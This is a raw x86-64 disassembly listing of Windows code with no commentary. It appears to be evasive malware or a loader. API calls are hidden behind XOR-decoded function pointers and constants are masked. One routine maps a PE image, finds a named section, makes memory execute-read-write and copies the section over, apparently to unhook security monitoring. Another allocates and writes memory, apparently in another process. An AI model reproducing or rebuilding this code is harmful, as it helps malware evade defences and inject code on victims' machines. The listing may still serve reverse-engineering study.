  404431:	b8 01 00 00 00       	mov    $0x1,%eax
  404436:	49 89 c0             	mov    %rax,%r8
  404439:	b8 00 00 00 80       	mov    $0x80000000,%eax
  40443e:	49 89 c3             	mov    %rax,%r11
  404441:	48 8d 85 d0 fd ff ff 	lea    -0x230(%rbp),%rax
  404448:	49 89 c2             	mov    %rax,%r10
  40444b:	4c 89 d1             	mov    %r10,%rcx
  40444e:	4c 89 da             	mov    %r11,%rdx
  404451:	4c 8b 1d f0 77 00 00 	mov    0x77f0(%rip),%r11        # 0x40bc48
  404458:	48 8b 05 11 78 00 00 	mov    0x7811(%rip),%rax        # 0x40bc70
  40445f:	4c 33 18             	xor    (%rax),%r11
  404462:	41 ff d3             	call   *%r11
  404465:	48 89 85 c8 fd ff ff 	mov    %rax,-0x238(%rbp)
  40446c:	48 8b 85 c8 fd ff ff 	mov    -0x238(%rbp),%rax
  404473:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  404477:	0f 85 0a 00 00 00    	jne    0x404487
  40447d:	b8 00 00 00 00       	mov    $0x0,%eax
  404482:	e9 95 03 00 00       	jmp    0x40481c
  404487:	31 c0                	xor    %eax,%eax
  404489:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40448e:	b8 00 00 00 00       	mov    $0x0,%eax
  404493:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404498:	b8 00 00 00 00       	mov    $0x0,%eax
  40449d:	49 89 c1             	mov    %rax,%r9
  4044a0:	b8 02 00 00 01       	mov    $0x1000002,%eax
  4044a5:	49 89 c0             	mov    %rax,%r8
  4044a8:	31 c0                	xor    %eax,%eax
  4044aa:	49 89 c3             	mov    %rax,%r11
  4044ad:	48 8b 85 c8 fd ff ff 	mov    -0x238(%rbp),%rax
  4044b4:	49 89 c2             	mov    %rax,%r10
  4044b7:	4c 89 d1             	mov    %r10,%rcx
  4044ba:	4c 89 da             	mov    %r11,%rdx
  4044bd:	4c 8b 1d bc 77 00 00 	mov    0x77bc(%rip),%r11        # 0x40bc80
  4044c4:	48 8b 05 dd 77 00 00 	mov    0x77dd(%rip),%rax        # 0x40bca8
  4044cb:	4c 33 18             	xor    (%rax),%r11
  4044ce:	41 ff d3             	call   *%r11
  4044d1:	48 89 85 c0 fd ff ff 	mov    %rax,-0x240(%rbp)
  4044d8:	48 8b 85 c0 fd ff ff 	mov    -0x240(%rbp),%rax
  4044df:	48 83 f8 00          	cmp    $0x0,%rax
  4044e3:	0f 85 2b 00 00 00    	jne    0x404514
  4044e9:	48 8b 85 c8 fd ff ff 	mov    -0x238(%rbp),%rax
  4044f0:	49 89 c2             	mov    %rax,%r10
  4044f3:	4c 89 d1             	mov    %r10,%rcx
  4044f6:	4c 8b 1d bb 77 00 00 	mov    0x77bb(%rip),%r11        # 0x40bcb8
  4044fd:	48 8b 05 dc 77 00 00 	mov    0x77dc(%rip),%rax        # 0x40bce0
  404504:	4c 33 18             	xor    (%rax),%r11
  404507:	41 ff d3             	call   *%r11
  40450a:	b8 00 00 00 00       	mov    $0x0,%eax
  40450f:	e9 08 03 00 00       	jmp    0x40481c
  404514:	31 c0                	xor    %eax,%eax
  404516:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40451b:	b8 00 00 00 00       	mov    $0x0,%eax
  404520:	49 89 c1             	mov    %rax,%r9
  404523:	b8 00 00 00 00       	mov    $0x0,%eax
  404528:	49 89 c0             	mov    %rax,%r8
  40452b:	b8 04 00 00 00       	mov    $0x4,%eax
  404530:	49 89 c3             	mov    %rax,%r11
  404533:	48 8b 85 c0 fd ff ff 	mov    -0x240(%rbp),%rax
  40453a:	49 89 c2             	mov    %rax,%r10
  40453d:	4c 89 d1             	mov    %r10,%rcx
  404540:	4c 89 da             	mov    %r11,%rdx
  404543:	4c 8b 1d a6 77 00 00 	mov    0x77a6(%rip),%r11        # 0x40bcf0
  40454a:	48 8b 05 c7 77 00 00 	mov    0x77c7(%rip),%rax        # 0x40bd18
  404551:	4c 33 18             	xor    (%rax),%r11
  404554:	41 ff d3             	call   *%r11
  404557:	48 89 85 b8 fd ff ff 	mov    %rax,-0x248(%rbp)
  40455e:	48 8b 85 b8 fd ff ff 	mov    -0x248(%rbp),%rax
  404565:	48 83 f8 00          	cmp    $0x0,%rax
  404569:	0f 85 4c 00 00 00    	jne    0x4045bb
  40456f:	48 8b 85 c0 fd ff ff 	mov    -0x240(%rbp),%rax
  404576:	49 89 c2             	mov    %rax,%r10
  404579:	4c 89 d1             	mov    %r10,%rcx
  40457c:	4c 8b 1d a5 77 00 00 	mov    0x77a5(%rip),%r11        # 0x40bd28
  404583:	48 8b 05 c6 77 00 00 	mov    0x77c6(%rip),%rax        # 0x40bd50
  40458a:	4c 33 18             	xor    (%rax),%r11
  40458d:	41 ff d3             	call   *%r11
  404590:	48 8b 85 c8 fd ff ff 	mov    -0x238(%rbp),%rax
  404597:	49 89 c2             	mov    %rax,%r10
  40459a:	4c 89 d1             	mov    %r10,%rcx
  40459d:	4c 8b 1d bc 77 00 00 	mov    0x77bc(%rip),%r11        # 0x40bd60
  4045a4:	48 8b 05 dd 77 00 00 	mov    0x77dd(%rip),%rax        # 0x40bd88
  4045ab:	4c 33 18             	xor    (%rax),%r11
  4045ae:	41 ff d3             	call   *%r11
  4045b1:	b8 00 00 00 00       	mov    $0x0,%eax
  4045b6:	e9 61 02 00 00       	jmp    0x40481c
  4045bb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4045bf:	48 89 85 b0 fd ff ff 	mov    %rax,-0x250(%rbp)
  4045c6:	48 8b 85 b0 fd ff ff 	mov    -0x250(%rbp),%rax
  4045cd:	48 83 c0 3c          	add    $0x3c,%rax
  4045d1:	8b 00                	mov    (%rax),%eax
  4045d3:	48 63 c0             	movslq %eax,%rax
  4045d6:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  4045da:	48 01 c1             	add    %rax,%rcx
  4045dd:	48 89 8d a8 fd ff ff 	mov    %rcx,-0x258(%rbp)
  4045e4:	b8 00 00 00 00       	mov    $0x0,%eax
  4045e9:	66 89 85 a6 fd ff ff 	mov    %ax,-0x25a(%rbp)
  4045f0:	48 8b 85 a8 fd ff ff 	mov    -0x258(%rbp),%rax
  4045f7:	48 83 c0 04          	add    $0x4,%rax
  4045fb:	48 83 c0 02          	add    $0x2,%rax
  4045ff:	0f b7 8d a6 fd ff ff 	movzwl -0x25a(%rbp),%ecx
  404606:	0f b7 00             	movzwl (%rax),%eax
  404609:	39 c1                	cmp    %eax,%ecx
  40460b:	0f 8d a3 01 00 00    	jge    0x4047b4
  404611:	e9 15 00 00 00       	jmp    0x40462b
  404616:	0f b7 85 a6 fd ff ff 	movzwl -0x25a(%rbp),%eax
  40461d:	89 c1                	mov    %eax,%ecx
  40461f:	83 c0 01             	add    $0x1,%eax
  404622:	66 89 85 a6 fd ff ff 	mov    %ax,-0x25a(%rbp)
  404629:	eb c5                	jmp    0x4045f0
  40462b:	48 8b 85 a8 fd ff ff 	mov    -0x258(%rbp),%rax
  404632:	48 83 c0 18          	add    $0x18,%rax
  404636:	48 8b 8d a8 fd ff ff 	mov    -0x258(%rbp),%rcx
  40463d:	48 83 c1 04          	add    $0x4,%rcx
  404641:	48 83 c1 10          	add    $0x10,%rcx
  404645:	0f b7 09             	movzwl (%rcx),%ecx
  404648:	48 01 c8             	add    %rcx,%rax
  40464b:	0f b7 8d a6 fd ff ff 	movzwl -0x25a(%rbp),%ecx
  404652:	ba e5 eb 71 cb       	mov    $0xcb71ebe5,%edx
  404657:	81 f2 cd eb 71 cb    	xor    $0xcb71ebcd,%edx
  40465d:	48 0f af ca          	imul   %rdx,%rcx
  404661:	48 01 c8             	add    %rcx,%rax
  404664:	48 89 85 98 fd ff ff 	mov    %rax,-0x268(%rbp)
  40466b:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  404672:	48 8d 0d 69 4e 00 00 	lea    0x4e69(%rip),%rcx        # 0x4094e2
  404679:	49 89 cb             	mov    %rcx,%r11
  40467c:	49 89 c2             	mov    %rax,%r10
  40467f:	4c 89 d1             	mov    %r10,%rcx
  404682:	4c 89 da             	mov    %r11,%rdx
  404685:	4c 8b 1d 0c 77 00 00 	mov    0x770c(%rip),%r11        # 0x40bd98
  40468c:	48 8b 05 2d 77 00 00 	mov    0x772d(%rip),%rax        # 0x40bdc0
  404693:	4c 33 18             	xor    (%rax),%r11
  404696:	41 ff d3             	call   *%r11
  404699:	83 f8 00             	cmp    $0x0,%eax
  40469c:	0f 85 0d 01 00 00    	jne    0x4047af
  4046a2:	b8 00 00 00 00       	mov    $0x0,%eax
  4046a7:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%rbp)
  4046ad:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  4046b4:	48 83 c0 0c          	add    $0xc,%rax
  4046b8:	8b 00                	mov    (%rax),%eax
  4046ba:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  4046be:	48 01 c1             	add    %rax,%rcx
  4046c1:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  4046c8:	48 83 c0 08          	add    $0x8,%rax
  4046cc:	8b 00                	mov    (%rax),%eax
  4046ce:	48 8d 95 94 fd ff ff 	lea    -0x26c(%rbp),%rdx
  4046d5:	49 89 d1             	mov    %rdx,%r9
  4046d8:	ba 40 00 00 00       	mov    $0x40,%edx
  4046dd:	49 89 d0             	mov    %rdx,%r8
  4046e0:	49 89 c3             	mov    %rax,%r11
  4046e3:	49 89 ca             	mov    %rcx,%r10
  4046e6:	4c 89 d1             	mov    %r10,%rcx
  4046e9:	4c 89 da             	mov    %r11,%rdx
  4046ec:	4c 8b 1d dd 76 00 00 	mov    0x76dd(%rip),%r11        # 0x40bdd0
  4046f3:	48 8b 05 fe 76 00 00 	mov    0x76fe(%rip),%rax        # 0x40bdf8
  4046fa:	4c 33 18             	xor    (%rax),%r11
  4046fd:	41 ff d3             	call   *%r11
  404700:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  404707:	48 83 c0 0c          	add    $0xc,%rax
  40470b:	8b 00                	mov    (%rax),%eax
  40470d:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  404711:	48 01 c1             	add    %rax,%rcx
  404714:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  40471b:	48 83 c0 0c          	add    $0xc,%rax
  40471f:	8b 00                	mov    (%rax),%eax
  404721:	48 8b 95 b8 fd ff ff 	mov    -0x248(%rbp),%rdx
  404728:	48 01 c2             	add    %rax,%rdx
  40472b:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  404732:	48 83 c0 08          	add    $0x8,%rax
  404736:	8b 00                	mov    (%rax),%eax
  404738:	49 89 c0             	mov    %rax,%r8
  40473b:	49 89 d3             	mov    %rdx,%r11
  40473e:	49 89 ca             	mov    %rcx,%r10
  404741:	4c 89 d1             	mov    %r10,%rcx
  404744:	4c 89 da             	mov    %r11,%rdx
  404747:	4c 8b 1d ba 76 00 00 	mov    0x76ba(%rip),%r11        # 0x40be08
  40474e:	48 8b 05 db 76 00 00 	mov    0x76db(%rip),%rax        # 0x40be30
  404755:	4c 33 18             	xor    (%rax),%r11
  404758:	41 ff d3             	call   *%r11
  40475b:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  404762:	48 83 c0 0c          	add    $0xc,%rax
  404766:	8b 00                	mov    (%rax),%eax
  404768:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
  40476c:	48 01 c1             	add    %rax,%rcx
  40476f:	48 8b 85 98 fd ff ff 	mov    -0x268(%rbp),%rax
  404776:	48 83 c0 08          	add    $0x8,%rax
  40477a:	8b 00                	mov    (%rax),%eax
  40477c:	48 8d 95 94 fd ff ff 	lea    -0x26c(%rbp),%rdx
  404783:	49 89 d1             	mov    %rdx,%r9
  404786:	8b 95 94 fd ff ff    	mov    -0x26c(%rbp),%edx
  40478c:	49 89 d0             	mov    %rdx,%r8
  40478f:	49 89 c3             	mov    %rax,%r11
  404792:	49 89 ca             	mov    %rcx,%r10
  404795:	4c 89 d1             	mov    %r10,%rcx
  404798:	4c 89 da             	mov    %r11,%rdx
  40479b:	4c 8b 1d 9e 76 00 00 	mov    0x769e(%rip),%r11        # 0x40be40
  4047a2:	48 8b 05 bf 76 00 00 	mov    0x76bf(%rip),%rax        # 0x40be68
  4047a9:	4c 33 18             	xor    (%rax),%r11
  4047ac:	41 ff d3             	call   *%r11
  4047af:	e9 62 fe ff ff       	jmp    0x404616
  4047b4:	48 8b 85 b8 fd ff ff 	mov    -0x248(%rbp),%rax
  4047bb:	49 89 c2             	mov    %rax,%r10
  4047be:	4c 89 d1             	mov    %r10,%rcx
  4047c1:	4c 8b 1d b0 76 00 00 	mov    0x76b0(%rip),%r11        # 0x40be78
  4047c8:	48 8b 05 d1 76 00 00 	mov    0x76d1(%rip),%rax        # 0x40bea0
  4047cf:	4c 33 18             	xor    (%rax),%r11
  4047d2:	41 ff d3             	call   *%r11
  4047d5:	48 8b 85 c0 fd ff ff 	mov    -0x240(%rbp),%rax
  4047dc:	49 89 c2             	mov    %rax,%r10
  4047df:	4c 89 d1             	mov    %r10,%rcx
  4047e2:	4c 8b 1d c7 76 00 00 	mov    0x76c7(%rip),%r11        # 0x40beb0
  4047e9:	48 8b 05 e8 76 00 00 	mov    0x76e8(%rip),%rax        # 0x40bed8
  4047f0:	4c 33 18             	xor    (%rax),%r11
  4047f3:	41 ff d3             	call   *%r11
  4047f6:	48 8b 85 c8 fd ff ff 	mov    -0x238(%rbp),%rax
  4047fd:	49 89 c2             	mov    %rax,%r10
  404800:	4c 89 d1             	mov    %r10,%rcx
  404803:	4c 8b 1d de 76 00 00 	mov    0x76de(%rip),%r11        # 0x40bee8
  40480a:	48 8b 05 ff 76 00 00 	mov    0x76ff(%rip),%rax        # 0x40bf10
  404811:	4c 33 18             	xor    (%rax),%r11
  404814:	41 ff d3             	call   *%r11
  404817:	b8 00 00 00 00       	mov    $0x0,%eax
  40481c:	c9                   	leave
  40481d:	c3                   	ret
  40481e:	cc                   	int3
  40481f:	cc                   	int3
  404820:	e8 00 00 00 00       	call   0x404825
  404825:	48 83 c4 08          	add    $0x8,%rsp
  404829:	c3                   	ret
  40482a:	90                   	nop
  40482b:	90                   	nop
  40482c:	cc                   	int3
  40482d:	90                   	nop
  40482e:	eb 0b                	jmp    0x40483b
  404830:	48 31 c0             	xor    %rax,%rax
  404833:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40483a:	90                   	nop
  40483b:	55                   	push   %rbp
  40483c:	48 89 e5             	mov    %rsp,%rbp
  40483f:	48 81 ec b0 03 00 00 	sub    $0x3b0,%rsp
  404846:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  40484a:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  40484e:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  404852:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  404856:	b8 00 00 00 00       	mov    $0x0,%eax
  40485b:	89 45 fc             	mov    %eax,-0x4(%rbp)
  40485e:	b8 01 00 00 00       	mov    $0x1,%eax
  404863:	49 89 c3             	mov    %rax,%r11
  404866:	48 8d 05 0b 4d 00 00 	lea    0x4d0b(%rip),%rax        # 0x409578
  40486d:	49 89 c2             	mov    %rax,%r10
  404870:	4c 89 d1             	mov    %r10,%rcx
  404873:	4c 89 da             	mov    %r11,%rdx
  404876:	4c 8b 1d d3 78 00 00 	mov    0x78d3(%rip),%r11        # 0x40c150
  40487d:	48 8b 05 f4 78 00 00 	mov    0x78f4(%rip),%rax        # 0x40c178
  404884:	4c 33 18             	xor    (%rax),%r11
  404887:	41 ff d3             	call   *%r11
  40488a:	4c 8b 1d f7 78 00 00 	mov    0x78f7(%rip),%r11        # 0x40c188
  404891:	48 8b 05 18 79 00 00 	mov    0x7918(%rip),%rax        # 0x40c1b0
  404898:	4c 33 18             	xor    (%rax),%r11
  40489b:	41 ff d3             	call   *%r11
  40489e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4048a2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4048a6:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
  4048aa:	49 89 c0             	mov    %rax,%r8
  4048ad:	8b 45 18             	mov    0x18(%rbp),%eax
  4048b0:	49 89 c3             	mov    %rax,%r11
  4048b3:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4048b7:	49 89 c2             	mov    %rax,%r10
  4048ba:	4c 89 d1             	mov    %r10,%rcx
  4048bd:	4c 89 da             	mov    %r11,%rdx
  4048c0:	4c 8b 1d f9 78 00 00 	mov    0x78f9(%rip),%r11        # 0x40c1c0
  4048c7:	48 8b 05 1a 79 00 00 	mov    0x791a(%rip),%rax        # 0x40c1e8
  4048ce:	4c 33 18             	xor    (%rax),%r11
  4048d1:	41 ff d3             	call   *%r11
  4048d4:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  4048d8:	48 89 01             	mov    %rax,(%rcx)
  4048db:	48 8b 45 40          	mov    0x40(%rbp),%rax
  4048df:	48 83 f8 00          	cmp    $0x0,%rax
  4048e3:	0f 84 0e 00 00 00    	je     0x4048f7
  4048e9:	48 8b 45 40          	mov    0x40(%rbp),%rax
  4048ed:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4048f1:	48 8b 09             	mov    (%rcx),%rcx
  4048f4:	48 89 08             	mov    %rcx,(%rax)
  4048f7:	31 c0                	xor    %eax,%eax
  4048f9:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4048fd:	b8 00 00 00 00       	mov    $0x0,%eax
  404902:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  404905:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404909:	48 8d 4d e4          	lea    -0x1c(%rbp),%rcx
  40490d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  404912:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
  404916:	49 89 c9             	mov    %rcx,%r9
  404919:	8b 4d 28             	mov    0x28(%rbp),%ecx
  40491c:	49 89 c8             	mov    %rcx,%r8
  40491f:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  404923:	49 89 cb             	mov    %rcx,%r11
  404926:	48 8b 00             	mov    (%rax),%rax
  404929:	49 89 c2             	mov    %rax,%r10
  40492c:	4c 89 d1             	mov    %r10,%rcx
  40492f:	4c 89 da             	mov    %r11,%rdx
  404932:	4c 8b 1d bf 78 00 00 	mov    0x78bf(%rip),%r11        # 0x40c1f8
  404939:	48 8b 05 e0 78 00 00 	mov    0x78e0(%rip),%rax        # 0x40c220
  404940:	4c 33 18             	xor    (%rax),%r11
  404943:	41 ff d3             	call   *%r11
  404946:	89 45 e0             	mov    %eax,-0x20(%rbp)
  404949:	31 c0                	xor    %eax,%eax
  40494b:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  40494f:	b8 00 00 00 00       	mov    $0x0,%eax
  404954:	89 45 d4             	mov    %eax,-0x2c(%rbp)
  404957:	b8 00 00 00 00       	mov    $0x0,%eax
  40495c:	89 45 d0             	mov    %eax,-0x30(%rbp)
  40495f:	8b 45 e0             	mov    -0x20(%rbp),%eax
  404962:	83 f8 00             	cmp    $0x0,%eax
  404965:	0f 84 9b 00 00 00    	je     0x404a06
  40496b:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40496f:	48 83 c0 08          	add    $0x8,%rax
  404973:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  404977:	48 89 08             	mov    %rcx,(%rax)
  40497a:	b8 90 1b ba c1       	mov    $0xc1ba1b90,%eax
  40497f:	81 f0 d8 1b ba c1    	xor    $0xc1ba1bd8,%eax
  404985:	49 89 c0             	mov    %rax,%r8
  404988:	b8 00 00 00 00       	mov    $0x0,%eax
  40498d:	49 89 c3             	mov    %rax,%r11
  404990:	48 8d 45 88          	lea    -0x78(%rbp),%rax
  404994:	49 89 c2             	mov    %rax,%r10
  404997:	4c 89 d1             	mov    %r10,%rcx
  40499a:	4c 89 da             	mov    %r11,%rdx
  40499d:	4c 8b 1d 8c 78 00 00 	mov    0x788c(%rip),%r11        # 0x40c230
  4049a4:	48 8b 05 ad 78 00 00 	mov    0x78ad(%rip),%rax        # 0x40c258
  4049ab:	4c 33 18             	xor    (%rax),%r11
  4049ae:	41 ff d3             	call   *%r11
  4049b1:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4049b5:	48 83 c0 08          	add    $0x8,%rax
  4049b9:	48 8b 00             	mov    (%rax),%rax
  4049bc:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4049c0:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4049c4:	48 8d 4d d4          	lea    -0x2c(%rbp),%rcx
  4049c8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  4049cd:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
  4049d1:	49 89 c9             	mov    %rcx,%r9
  4049d4:	b9 48 00 00 00       	mov    $0x48,%ecx
  4049d9:	49 89 c8             	mov    %rcx,%r8
  4049dc:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
  4049e0:	49 89 cb             	mov    %rcx,%r11
  4049e3:	48 8b 00             	mov    (%rax),%rax
  4049e6:	49 89 c2             	mov    %rax,%r10
  4049e9:	4c 89 d1             	mov    %r10,%rcx
  4049ec:	4c 89 da             	mov    %r11,%rdx
  4049ef:	4c 8b 1d 72 78 00 00 	mov    0x7872(%rip),%r11        # 0x40c268
  4049f6:	48 8b 05 93 78 00 00 	mov    0x7893(%rip),%rax        # 0x40c290
  4049fd:	4c 33 18             	xor    (%rax),%r11
  404a00:	41 ff d3             	call   *%r11
  404a03:	89 45 d0             	mov    %eax,-0x30(%rbp)
  404a06:	8b 45 e0             	mov    -0x20(%rbp),%eax
  404a09:	83 f8 00             	cmp    $0x0,%eax
  404a0c:	0f 84 72 00 00 00    	je     0x404a84
  404a12:	8b 45 d0             	mov    -0x30(%rbp),%eax
  404a15:	83 f8 00             	cmp    $0x0,%eax
  404a18:	0f 84 66 00 00 00    	je     0x404a84
  404a1e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404a22:	48 8b 00             	mov    (%rax),%rax
  404a25:	49 89 c3             	mov    %rax,%r11
  404a28:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404a2c:	49 89 c2             	mov    %rax,%r10
  404a2f:	4c 89 d1             	mov    %r10,%rcx
  404a32:	4c 89 da             	mov    %r11,%rdx
  404a35:	4c 8b 1d 64 78 00 00 	mov    0x7864(%rip),%r11        # 0x40c2a0
  404a3c:	48 8b 05 85 78 00 00 	mov    0x7885(%rip),%rax        # 0x40c2c8
  404a43:	4c 33 18             	xor    (%rax),%r11
  404a46:	41 ff d3             	call   *%r11
  404a49:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  404a4d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404a51:	49 89 c0             	mov    %rax,%r8
  404a54:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404a58:	49 89 c3             	mov    %rax,%r11
  404a5b:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404a5f:	49 89 c2             	mov    %rax,%r10
  404a62:	4c 89 d1             	mov    %r10,%rcx
  404a65:	4c 89 da             	mov    %r11,%rdx
  404a68:	4c 8b 1d 69 78 00 00 	mov    0x7869(%rip),%r11        # 0x40c2d8
  404a6f:	48 8b 05 8a 78 00 00 	mov    0x788a(%rip),%rax        # 0x40c300
  404a76:	4c 33 18             	xor    (%rax),%r11
  404a79:	41 ff d3             	call   *%r11
  404a7c:	8b 45 fc             	mov    -0x4(%rbp),%eax
  404a7f:	e9 3a 03 00 00       	jmp    0x404dbe
  404a84:	8b 45 e0             	mov    -0x20(%rbp),%eax
  404a87:	83 f8 00             	cmp    $0x0,%eax
  404a8a:	0f 85 76 00 00 00    	jne    0x404b06
  404a90:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404a94:	48 83 c0 08          	add    $0x8,%rax
  404a98:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  404a9c:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
  404aa0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404aa5:	8b 45 38             	mov    0x38(%rbp),%eax
  404aa8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404aad:	48 8b 45 30          	mov    0x30(%rbp),%rax
  404ab1:	49 89 c1             	mov    %rax,%r9
  404ab4:	8b 45 28             	mov    0x28(%rbp),%eax
  404ab7:	49 89 c0             	mov    %rax,%r8
  404aba:	48 8b 45 20          	mov    0x20(%rbp),%rax
  404abe:	49 89 c3             	mov    %rax,%r11
  404ac1:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404ac5:	49 89 c2             	mov    %rax,%r10
  404ac8:	4c 89 d1             	mov    %r10,%rcx
  404acb:	4c 89 da             	mov    %r11,%rdx
  404ace:	4c 8b 1d 3b 78 00 00 	mov    0x783b(%rip),%r11        # 0x40c310
  404ad5:	48 8b 05 5c 78 00 00 	mov    0x785c(%rip),%rax        # 0x40c338
  404adc:	4c 33 18             	xor    (%rax),%r11
  404adf:	41 ff d3             	call   *%r11
  404ae2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  404ae6:	48 89 01             	mov    %rax,(%rcx)
  404ae9:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404aed:	48 83 c0 08          	add    $0x8,%rax
  404af1:	48 8b 00             	mov    (%rax),%rax
  404af4:	48 83 f8 00          	cmp    $0x0,%rax
  404af8:	0f 85 08 00 00 00    	jne    0x404b06
  404afe:	8b 45 fc             	mov    -0x4(%rbp),%eax
  404b01:	e9 b8 02 00 00       	jmp    0x404dbe
  404b06:	8b 45 d0             	mov    -0x30(%rbp),%eax
  404b09:	83 f8 00             	cmp    $0x0,%eax
  404b0c:	0f 85 d7 00 00 00    	jne    0x404be9
  404b12:	b8 48 00 00 00       	mov    $0x48,%eax
  404b17:	49 89 c0             	mov    %rax,%r8
  404b1a:	b8 00 00 00 00       	mov    $0x0,%eax
  404b1f:	49 89 c3             	mov    %rax,%r11
  404b22:	48 8d 85 38 ff ff ff 	lea    -0xc8(%rbp),%rax
  404b29:	49 89 c2             	mov    %rax,%r10
  404b2c:	4c 89 d1             	mov    %r10,%rcx
  404b2f:	4c 89 da             	mov    %r11,%rdx
  404b32:	4c 8b 1d 0f 78 00 00 	mov    0x780f(%rip),%r11        # 0x40c348
  404b39:	48 8b 05 30 78 00 00 	mov    0x7830(%rip),%rax        # 0x40c370
  404b40:	4c 33 18             	xor    (%rax),%r11
  404b43:	41 ff d3             	call   *%r11
  404b46:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404b4a:	48 83 c0 08          	add    $0x8,%rax
  404b4e:	48 8b 00             	mov    (%rax),%rax
  404b51:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404b58:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404b5c:	b9 04 00 00 00       	mov    $0x4,%ecx
  404b61:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  404b66:	b9 00 30 00 00       	mov    $0x3000,%ecx
  404b6b:	49 89 c9             	mov    %rcx,%r9
  404b6e:	b9 48 00 00 00       	mov    $0x48,%ecx
  404b73:	49 89 c8             	mov    %rcx,%r8
  404b76:	31 c9                	xor    %ecx,%ecx
  404b78:	49 89 cb             	mov    %rcx,%r11
  404b7b:	48 8b 00             	mov    (%rax),%rax
  404b7e:	49 89 c2             	mov    %rax,%r10
  404b81:	4c 89 d1             	mov    %r10,%rcx
  404b84:	4c 89 da             	mov    %r11,%rdx
  404b87:	4c 8b 1d f2 77 00 00 	mov    0x77f2(%rip),%r11        # 0x40c380
  404b8e:	48 8b 05 13 78 00 00 	mov    0x7813(%rip),%rax        # 0x40c3a8
  404b95:	4c 33 18             	xor    (%rax),%r11
  404b98:	41 ff d3             	call   *%r11
  404b9b:	48 89 85 30 ff ff ff 	mov    %rax,-0xd0(%rbp)
  404ba2:	48 8b 45 10          	mov    0x10(%rbp),%rax
  404ba6:	31 c9                	xor    %ecx,%ecx
  404ba8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  404bad:	b9 48 00 00 00       	mov    $0x48,%ecx
  404bb2:	49 89 c9             	mov    %rcx,%r9
  404bb5:	48 8d 8d 38 ff ff ff 	lea    -0xc8(%rbp),%rcx
  404bbc:	49 89 c8             	mov    %rcx,%r8
  404bbf:	48 8b 8d 30 ff ff ff 	mov    -0xd0(%rbp),%rcx
  404bc6:	49 89 cb             	mov    %rcx,%r11
  404bc9:	48 8b 00             	mov    (%rax),%rax
  404bcc:	49 89 c2             	mov    %rax,%r10
  404bcf:	4c 89 d1             	mov    %r10,%rcx
  404bd2:	4c 89 da             	mov    %r11,%rdx
  404bd5:	4c 8b 1d dc 77 00 00 	mov    0x77dc(%rip),%r11        # 0x40c3b8
  404bdc:	48 8b 05 fd 77 00 00 	mov    0x77fd(%rip),%rax        # 0x40c3e0
  404be3:	4c 33 18             	xor    (%rax),%r11
  404be6:	41 ff d3             	call   *%r11
  404be9:	b8 1c 76 4a a0       	mov    $0xa04a761c,%eax
  404bee:	81 f0 14 74 4a a0    	xor    $0xa04a7414,%eax
  404bf4:	49 89 c0             	mov    %rax,%r8
  404bf7:	b8 00 00 00 00       	mov    $0x0,%eax
  404bfc:	49 89 c3             	mov    %rax,%r11
  404bff:	48 8d 85 28 fd ff ff 	lea    -0x2d8(%rbp),%rax
  404c06:	49 89 c2             	mov    %rax,%r10
  404c09:	4c 89 d1             	mov    %r10,%rcx
  404c0c:	4c 89 da             	mov    %r11,%rdx
